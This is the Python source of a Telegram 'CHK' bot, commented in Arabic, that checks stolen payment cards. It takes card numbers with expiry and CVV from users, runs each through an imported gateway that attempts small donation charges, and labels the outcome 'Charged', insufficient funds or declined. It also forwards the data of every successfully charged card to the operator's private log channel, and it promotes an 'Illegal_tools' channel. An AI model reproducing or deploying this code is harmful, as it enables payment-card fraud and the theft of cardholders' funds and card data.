import os
import json
import time
from telebot import TeleBot, types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from gatet import Tele
from hit_sender import send

# ================= ADMIN =================
ADMIN_IDS = [6891530912]  # @mouhamed_ma

# ================= TOKEN =================
with open('token.txt', 'r') as f:
    token = f.read().strip()

bot = TeleBot(token, parse_mode="HTML")

# ================= LOG CHANNEL =================
LOG_CHANNEL = -1003729799230

try:
    bot.send_message(LOG_CHANNEL, "✅ LOG TEST OK")
    print("LOG OK")
except Exception as e:
    print("LOG FAIL:", e)

# ================= FORCE SUBSCRIPTION CHANNELS (تعديل حسب قناتيك) =================
FORCE_CHANNEL_1 = -1001234567890      # ضع معرف القناة الأولى (رقم سالب)
FORCE_CHANNEL_1_LINK = "https://t.me/mouhammed_ma"

FORCE_CHANNEL_2 = -1002514428576      # ضع معرف القناة الثانية
FORCE_CHANNEL_2_LINK = "https://t.me/Illegal_tools"

FORCE_SUB_MSG = (
    "📢 <b>𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱</b>\n\n"
    
    "<blockquote>"
    "🚫 يجب الاشتراك في القنوات التالية لاستخدام البوت\n\n"
    
    "➊ <a href='{link1}'>القناة الأولى</a>\n"
    "➋ <a href='{link2}'>القناة الثانية</a>\n\n"
    
    "✅ بعد إكمال الاشتراك اضغط على زر التحقق"
    "</blockquote>"
)

# ================= DB =================
CREDITS_FILE = "credits.json"
DEFAULT_CREDITS = 1

def load_db():
    if not os.path.exists(CREDITS_FILE):
        return {}
    try:
        with open(CREDITS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_db(db):
    with open(CREDITS_FILE, "w") as f:
        json.dump(db, f, indent=2)

def ensure_user(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"credits": DEFAULT_CREDITS}
        save_db(db)
    return db

def spend_credit_or_block(message, cost=1):
    db = ensure_user(message.from_user.id)
    uid = str(message.from_user.id)

    if db[uid]["credits"] < cost:
        bot.reply_to(message, "❌ No credits left. Use /request")
        return None

    db[uid]["credits"] -= cost
    save_db(db)
    return db[uid]["credits"]

# ================= FORCE SUBSCRIPTION FUNCTIONS =================
def is_subscribed(user_id):
    """التحقق من اشتراك المستخدم في القناتين"""
    try:
        status1 = bot.get_chat_member(FORCE_CHANNEL_1, user_id).status
        status2 = bot.get_chat_member(FORCE_CHANNEL_2, user_id).status
        return (status1 in ["member", "administrator", "creator"] and
                status2 in ["member", "administrator", "creator"])
    except:
        return False

def send_force_sub_message(chat_id, user_id):
    """إرسال رسالة الاشتراك الإجباري مع أزرار القنوات"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    btn1 = InlineKeyboardButton("📢 اشترك في القناة 1", url=FORCE_CHANNEL_1_LINK)
    btn2 = InlineKeyboardButton("📢 اشترك في القناة 2", url=FORCE_CHANNEL_2_LINK)
    check_btn = InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data=f"check_sub_{user_id}")
    keyboard.add(btn1, btn2)
    keyboard.add(check_btn)

    text = FORCE_SUB_MSG.format(link1=FORCE_CHANNEL_1_LINK, link2=FORCE_CHANNEL_2_LINK)
    bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode="Markdown", disable_web_page_preview=True)

def subscription_required(func):
    """ديكوراتر للتحقق من الاشتراك قبل تنفيذ الأمر"""
    def wrapper(message):
        user_id = message.from_user.id
        if not is_subscribed(user_id):
            send_force_sub_message(message.chat.id, user_id)
            return
        return func(message)
    return wrapper

# ================= CALLBACK HANDLER للتحقق =================
@bot.callback_query_handler(func=lambda call: call.data.startswith("check_sub_"))
def check_sub_callback(call: CallbackQuery):
    user_id = int(call.data.split("_")[2])
    if user_id != call.from_user.id:
        bot.answer_callback_query(call.id, "هذا الزر ليس لك", show_alert=True)
        return

    if is_subscribed(user_id):
        bot.edit_message_text(
            "✅ **تم التحقق! أنت مشترك في القناتين. يمكنك استخدام البوت الآن.**",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        # إرسال قائمة الأزرار الرئيسية بعد التحقق
        send_main_menu(call.message.chat.id, user_id)
    else:
        bot.answer_callback_query(call.id, "❌ لم يتم الاشتراك بعد، تأكد من الاشتراك في القناتين ثم اضغط تحقق.", show_alert=True)
        # إعادة إرسال رسالة الاشتراك (أو تحديثها)
        send_force_sub_message(call.message.chat.id, user_id)

# ================= القائمة الرئيسية (أزرار) =================
def send_main_menu(chat_id, user_id):
    db = ensure_user(user_id)
    credits = db[str(user_id)]["credits"]
    username = bot.get_chat(user_id).username or "NoUsername"

    keyboard = InlineKeyboardMarkup(row_width=2)
    btn_chk = InlineKeyboardButton("💳 CHECK CARD (/chk)", callback_data="cmd_chk")
    btn_req = InlineKeyboardButton("📩 REQUEST CREDIT (/request)", callback_data="cmd_request")
    btn_info = InlineKeyboardButton("ℹ️ MY INFO (/info)", callback_data="cmd_info")
    keyboard.add(btn_chk, btn_req)
    keyboard.add(btn_info)

    text = (
        f"👤 @{username} (FREE)\n"
        f"Remaining Credits: {credits}\n\n"
        f"Click a button:"
    )
    bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode="HTML")

# ================= معالجة أزرار القائمة =================
@bot.callback_query_handler(func=lambda call: call.data.startswith("cmd_"))
def menu_callback(call: CallbackQuery):
    user_id = call.from_user.id
    chat_id = call.message.chat.id

    # التحقق من الاشتراك مرة أخرى (احتياطي)
    if not is_subscribed(user_id):
        bot.answer_callback_query(call.id, "❌ يرجى الاشتراك في القناتين أولاً", show_alert=True)
        send_force_sub_message(chat_id, user_id)
        return

    cmd = call.data.split("_")[1]  # chk, request, info

    if cmd == "chk":
        # نحاكي إرسال أمر /chk مع طلب من المستخدم إدخال البطاقة
        bot.send_message(chat_id, "📝 أرسل البطاقة بهذا التنسيق:\n`cc|mm|yy|cvv`\nمثال: `4242424242424242|12|26|123`", parse_mode="Markdown")
        # نحتاج لتخزين مؤقت أن المستخدم في وضع إدخال البطاقة، لكن الأسهل: جعل المستخدم يرسل /chk يدوياً أو نستخدم next_step_handler.
        # سنستخدم next_step_handler بسيط:
        bot.register_next_step_handler_by_chat_id(chat_id, process_cc_input, user_id)
        bot.answer_callback_query(call.id)
    elif cmd == "request":
        # تنفيذ أمر الطلب
        request_credits_logic(chat_id, user_id)
        bot.answer_callback_query(call.id)
    elif cmd == "info":
        show_info(chat_id, user_id)
        bot.answer_callback_query(call.id)

def process_cc_input(message, user_id):
    """معالجة البطاقة التي أرسلها المستخدم بعد ضغط زر /chk"""
    if message.from_user.id != user_id:
        return
    # إعادة توجيه إلى منطق check_card الموجود
    # نعدل message مؤقتاً ليحتوي على نص "/chk <cc>"
    message.text = f"/chk {message.text.strip()}"
    check_card(message)

def request_credits_logic(chat_id, user_id):
    username = bot.get_chat(user_id).username or "NoUsername"
    bot.send_message(chat_id, "✅ Request sent to admin.")
    for admin_id in ADMIN_IDS:
        bot.send_message(
            admin_id,
            f"📩 <b>Credit Request</b>\n\n"
            f"User: @{username}\n"
            f"ID: <code>{user_id}</code>",
            parse_mode="HTML"
        )

def show_info(chat_id, user_id):
    db = ensure_user(user_id)
    credits = db[str(user_id)]["credits"]
    username = bot.get_chat(user_id).username or "NoUsername"
    bot.send_message(
        chat_id,
        f"👤 @{username}\nRemaining Credits: {credits}",
        parse_mode="HTML"
    )

# ================= الأوامر الأصلية (مزودة بالديكورات مع تحقق الاشتراك) =================
@bot.message_handler(commands=["start"])
def start_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    ensure_user(user_id)

    if not is_subscribed(user_id):
        send_force_sub_message(chat_id, user_id)
    else:
        send_main_menu(chat_id, user_id)

@bot.message_handler(commands=["info"])
@subscription_required
def info_cmd(message):
    show_info(message.chat.id, message.from_user.id)

@bot.message_handler(commands=["request"])
@subscription_required
def request_cmd(message):
    request_credits_logic(message.chat.id, message.from_user.id)

@bot.message_handler(commands=["addcredits"])
def add_credits(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not admin.")
        return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "Usage:\n/addcredits user_id amount")
        return
    target_id = args[1]
    try:
        amount = int(args[2])
    except Exception:
        bot.reply_to(message, "Amount must be a number.")
        return
    if amount <= 0:
        bot.reply_to(message, "Amount must be > 0.")
        return
    db = load_db()
    if target_id not in db:
        db[target_id] = {"credits": 0}
    db[target_id]["credits"] += amount
    save_db(db)
    bot.reply_to(
        message,
        f"✅ Credits Added\nUser ID: {target_id}\nAdded: {amount}\nRemaining: {db[target_id]['credits']}"
    )
    try:
        bot.send_message(
            int(target_id),
            f"🎉 <b>Credits Added!</b>\n+{amount}\nBalance: <b>{db[target_id]['credits']}</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass

# ================= CHK COMMAND الأصلي (مع تعديل بسيط للديكور) =================
@bot.message_handler(commands=['chk'])
@subscription_required
def check_card(message):
    msg_id = None
    try:
        remaining = spend_credit_or_block(message, cost=1)
        if remaining is None:
            return

        text = message.text or ""
        parts = text.split('/chk', 1)
        cc = parts[1].strip() if len(parts) > 1 else ""

        username = message.from_user.username or "NoUsername"

        msg = bot.reply_to(message, "Checking your card...")
        msg_id = msg.message_id
        start_time = time.time()

        if not cc:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg_id,
                text="Invalid format. Use: cc|mm|yy|cvv",
                parse_mode="HTML"
            )
            return

        try:
            last = str(Tele(cc))
        except:
            last = 'API Error'

        # ===== MAP RESULT =====
        if "Donation Successful!" in last:
            last = '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥'
        elif "Your card does not support this type of purchase" in last:
            last = 'Your card does not support this type of purchase'
        elif "security code is incorrect" in last or "security code is invalid" in last:
            last = 'security code is incorrect/invalid'
        elif "insufficient funds" in last:
            last = 'INSUFFICIENT_FUNDS 🔥'
        else:
            last = 'Declined'

        time_taken = round(time.time() - start_time, 2)

        send_response = send(cc, last, username, time_taken, remaining)

        # ✅ CHARGED ONLY LOG (fixed)
        log_charged_only(message, last, send_response)

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg_id,
            text=send_response,
            parse_mode="HTML"
        )

    except Exception as e:
        if msg_id:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg_id,
                text="An error occurred while processing your request."
            )
        print("CHK ERROR:", e)

# ================= CHARGED ONLY LOGGER (بدون تغيير) =================
def log_charged_only(message, result_text, full_message):
    try:
        t = (result_text or "").lower()
        if not any(x in t for x in ("charged", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝".lower(), "donation successful")):
            return
        bot.send_message(LOG_CHANNEL, full_message, parse_mode="HTML", disable_web_page_preview=True)
        print("✅ CHARGED LOG SENT")
    except Exception as e:
        print("CHARGED LOG ERROR:", e)

# ================= START BOT =================
if __name__ == "__main__":
    bot.infinity_polling(timeout=25, long_polling_timeout=25)